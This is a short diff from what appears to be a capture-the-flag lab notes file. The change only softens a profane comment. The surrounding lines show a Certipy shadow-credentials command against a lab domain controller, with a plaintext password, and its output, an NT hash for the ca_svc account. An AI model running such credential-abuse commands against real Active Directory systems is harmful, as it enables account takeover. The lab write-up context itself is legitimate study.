@@ -361,7 +361,7 @@ https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/key-credentials-abuse
 ./bin/python3 certipy/entry.py shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51' -target dc01.sequel.htb -ns 10.10.11.51
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
-if cipher text error reset the machine some mf might have fukced it
+if cipher text error reset the machine some mf might have messed it up
 
 [*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
 
